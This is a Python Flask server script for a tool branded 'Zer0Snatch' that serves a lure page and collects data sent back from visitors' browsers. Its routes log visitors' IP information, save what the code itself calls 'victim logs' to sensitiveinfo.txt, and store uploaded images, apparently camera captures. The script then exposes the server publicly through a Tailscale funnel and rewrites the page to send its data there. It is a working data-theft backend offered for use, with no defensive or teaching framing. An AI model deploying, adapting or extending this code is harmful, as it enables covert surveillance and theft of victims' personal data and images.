from colorama import Fore, Back, Style
from flask import Flask, render_template, url_for, request, jsonify, Response
from werkzeug.utils import secure_filename
import time
import os
import subprocess
import threading
import signal
import sys
import shutil
import logging
import re
import random

# Setup image directory
IMAGE_DIR = 'image'
if not os.path.exists(IMAGE_DIR):
    os.makedirs(IMAGE_DIR)

app = Flask(__name__)

# Silence Flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


def banner():
    banners = [r"""
ZZZZZZZZZZZZZZZZZZZ                                             000000000        SSSSSSSSSSSSSSS                                           tttt                             hhhhhhh             
Z:::::::::::::::::Z                                           00:::::::::00    SS:::::::::::::::S                                       ttt:::t                             h:::::h             
Z:::::::::::::::::Z                                         00:::::::::::::00 S:::::SSSSSS::::::S                                       t:::::t                             h:::::h             
Z:::ZZZZZZZZ:::::Z                                         0:::::::000:::::::0S:::::S     SSSSSSS                                       t:::::t                             h:::::h             
ZZZZZ     Z:::::Z      eeeeeeeeeeee    rrrrr   rrrrrrrrr   0::::::0   0::::::0S:::::S          nnnn  nnnnnnnn      aaaaaaaaaaaaa  ttttttt:::::ttttttt        cccccccccccccccch::::h hhhhh      
        Z:::::Z      ee::::::::::::ee  r::::rrr:::::::::r  0:::::0     0:::::0S:::::S          n:::nn::::::::nn    a::::::::::::a t:::::::::::::::::t      cc:::::::::::::::ch::::hh:::::hhh   
       Z:::::Z      e::::::eeeee:::::eer:::::::::::::::::r 0:::::0     0:::::0 S::::SSSS       n::::::::::::::nn   aaaaaaaaa:::::at:::::::::::::::::t     c:::::::::::::::::ch::::::::::::::hh 
      Z:::::Z      e::::::e     e:::::err::::::rrrrr::::::r0:::::0 000 0:::::0  SS::::::SSSSS  nn:::::::::::::::n           a::::atttttt:::::::tttttt    c:::::::cccccc:::::ch:::::::hhh::::::h
     Z:::::Z       e:::::::eeeee::::::e r:::::r     r:::::r0:::::0 000 0:::::0    SSS::::::::SS  n:::::nnnn:::::n    aaaaaaa:::::a      t:::::t          c::::::c     ccccccch::::::h   h::::::h
    Z:::::Z        e:::::::::::::::::e  r:::::r     rrrrrrr0:::::0     0:::::0       SSSSSS::::S n::::n    n::::n  aa::::::::::::a      t:::::t          c:::::c             h:::::h     h:::::h
   Z:::::Z         e::::::eeeeeeeeeee   r:::::r            0:::::0     0:::::0            S:::::Sn::::n    n::::n a::::aaaa::::::a      t:::::t          c:::::c             h:::::h     h:::::h
ZZZ:::::Z     ZZZZZe:::::::e            r:::::r            0::::::0   0::::::0            S:::::Sn::::n    n::::na::::a    a:::::a      t:::::t    ttttttc::::::c     ccccccch:::::h     h:::::h
Z::::::ZZZZZZZZ:::Ze::::::::e           r:::::r            0:::::::000:::::::0SSSSSSS     S:::::Sn::::n    n::::na::::a    a:::::a      t::::::tttt:::::tc:::::::cccccc:::::ch:::::h     h:::::h
Z:::::::::::::::::Z e::::::::eeeeeeee   r:::::r             00:::::::::::::00 S::::::SSSSSS:::::Sn::::n    n::::na:::::aaaa::::::a      tt::::::::::::::t c:::::::::::::::::ch:::::h     h:::::h
Z:::::::::::::::::Z  ee:::::::::::::e   r:::::r               00:::::::::00   S:::::::::::::::SS n::::n    n::::n a::::::::::aa:::a       tt:::::::::::tt  cc:::::::::::::::ch:::::h     h:::::h
ZZZZZZZZZZZZZZZZZZZ    eeeeeeeeeeeeee   rrrrrrr                 000000000      SSSSSSSSSSSSSSS   nnnnnn    nnnnnn  aaaaaaaaaa  aaaa         ttttttttttt      cccccccccccccccchhhhhhh     hhhhhhh
""",
    r"""
@@@@@@@@  @@@@@@@@  @@@@@@@    @@@@@@@@    @@@@@@   @@@  @@@   @@@@@@   @@@@@@@   @@@@@@@  @@@  @@@  
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@  @@@@@@@   @@@@ @@@  @@@@@@@@  @@@@@@@  @@@@@@@@  @@@  @@@  
     @@!  @@!       @@!  @@@  @@!   @@@@  !@@       @@!@!@@@  @@!  @@@    @@!    !@@       @@!  @@@  
    !@!   !@!       !@!  @!@  !@!  @!@!@  !@!       !@!!@!@!  !@!  @!@    !@!    !@!       !@!  @!@  
   @!!    @!!!:!    @!@!!@!   @!@ @! !@!  !!@@!!    @!@ !!@!  @!@!@!@!    @!!    !@!       @!@!@!@!  
  !!!     !!!!!:    !!@!@!    !@!!!  !!!   !!@!!!   !@!  !!!  !!!@!!!!    !!!    !!!       !!!@!!!!  
 !!:      !!:       !!: :!!   !!:!   !!!       !:!  !!:  !!!  !!:  !!!    !!:    :!!       !!:  !!!  
:!:       :!:       :!:  !:!  :!:    !:!      !:!   :!:  !:!  :!:  !:!    :!:    :!:       :!:  !:!  
 :: ::::   :: ::::  ::   :::  ::::::: ::  :::: ::    ::   ::  ::   :::     ::     ::: :::  ::   :::  
: :: : :  : :: ::    :   : :   : : :  :   :: : :    ::    :    :   : :     :      :: :: :   :   : :  
"""
    ]
    print(Fore.CYAN + Style.BRIGHT + random.choice(banners) + Style.RESET_ALL)


@app.route('/')
def index():
    return Response(open('index.html').read(), mimetype="text/html")

@app.route('/ipinfo', methods=['POST'])
def ipinfos():
    iplogs = request.get_json()
    with open('ipinfo.txt', 'a') as f:
        f.write(f"\n{iplogs}\n")
    print(Fore.MAGENTA + "----------------------------------------------------")
    print(Fore.RED + "Ip Logs saved to **ipinfo.txt**")
    print(Fore.MAGENTA + "----------------------------------------------------" + Style.RESET_ALL)
    return jsonify({'processed': 'true'})

@app.route('/process_qtc', methods=['POST'])
def getvictimlogs():
    logs = request.get_json()
    with open('sensitiveinfo.txt', 'a') as log:
        log.write(f"\n{logs}\n")
    print(logs)
    print(Fore.MAGENTA + "----------------------------------------------------")
    print(Fore.RED + "Victim Logs saved  to **sensitiveinfo.txt**")
    print(Fore.MAGENTA + "----------------------------------------------------" + Style.RESET_ALL)
    return jsonify({'processed': 'true'})

@app.route('/image', methods=['POST'])
def image():
    if 'image' not in request.files:
        return Response("No image part in the request", status=400)

    file = request.files['image']
    if file.filename == '':
        return Response("No selected file", status=400)

    if file:
        filename = f"{time.strftime('%Y%m%d-%H%M%S')}_{secure_filename(file.filename)}"
        full_path = os.path.join(IMAGE_DIR, filename)
        file.save(full_path)
        print(Fore.YELLOW + f"Image saved successfully at {full_path}" + Style.RESET_ALL)
        return Response(f"{filename} saved", status=200)
    else:
        return Response("Invalid file", status=400)

def check_tailscale():
    print("[+] Checking if Tailscale is installed...")
    if shutil.which("tailscale") is None:
        print("[!] Tailscale is not installed.")
        choice = input("Do you want to install Tailscale now? (y/n): ").strip().lower()
        if choice == 'y':
            print("[+] Installing Tailscale...")
            subprocess.run(['curl', '-fsSL', 'https://tailscale.com/install.sh', '-o', 'install_tailscale.sh'], check=True)
            subprocess.run(['sudo', 'bash', 'install_tailscale.sh'], check=True)
            print("[+] Tailscale installation completed.")
        else:
            print("[!] Skipping Tailscale installation. The app might not work as intended.")
            return False
    else:
        print("[+] Tailscale is already installed.")

    print("\n[+] To authenticate Tailscale, open this URL in your browser:")
    print("    https://login.tailscale.com")
    subprocess.run(['sudo','tailscale','up'])
    input("[*] Press Enter after you have authenticated Tailscale to continue...")
    return True

def update_index_html_with_url(url, index_file_path='index.html'):
    try:
        url = url.rstrip('/')
        with open(index_file_path, 'r') as file:
            content = file.read()

        new_content = re.sub(
            r"(xhr\\.open\\(\\s*'POST',\\s*')[^']+('\s*,\\s*true\\s*\\);)",
            rf"\\1{url}/image\\2",
            content
        )

        with open(index_file_path, 'w') as file:
            file.write(new_content)

        print(f"[+] Updated {index_file_path} with correct URL.")
    except Exception as e:
        print(f"[!] Failed to update {index_file_path}: {e}")

def start_tailscale_funnel(port=8080):
    print(f"[~] Starting Tailscale funnel on port {port}...")
    funnel_proc = subprocess.Popen(['sudo', 'tailscale', 'funnel', str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    funnel_url = None
    for _ in range(10):
        line = funnel_proc.stdout.readline()
        if not line:
            time.sleep(1)
            continue
        print(line.strip())
        if 'https://' in line and '.ts.net' in line:
            funnel_url = line.strip()
            break

    if funnel_url:
        print(f"[*] Tailscale Tunnel URL: {funnel_url}")
        update_index_html_with_url(funnel_url)
        print("[+] Updated index.html with the Tailscale URL.")
    else:
        print("[!] Could not find Tailscale funnel URL.")

    return funnel_proc

if __name__ == "__main__":
    banner()  # 👈 Show the Zer0Snatch banner first

    try:
        user_port = input("Enter the port you want to run the Flask app on (default 8080): ").strip()
        port = int(user_port) if user_port else 8080
    except ValueError:
        print("[!] Invalid port number. Using default port 8080.")
        port = 8080

    use_tailscale = input("Do you want to use Tailscale tunnel? (y/n): ").strip().lower()

    if use_tailscale == 'y':
        if not check_tailscale():
            print("[!] Tailscale check/install failed or skipped. Exiting.")
            sys.exit(1)

        funnel_process = start_tailscale_funnel(port)
    else:
        local_url = f"http://localhost:{port}"
        print(f"[*] Hosting locally at: {local_url}")
        update_index_html_with_url(local_url)
        print("[!] Note: You're hosting locally. If you want to expose this over the internet, enable Tailscale functionality.")
        funnel_process = None

    try:
        app.run(debug=False, host='0.0.0.0', port=port)
    except KeyboardInterrupt:
        if funnel_process:
            print("\n[!] Interrupt received, stopping Tailscale funnel...")
            funnel_process.terminate()
        sys.exit(0)
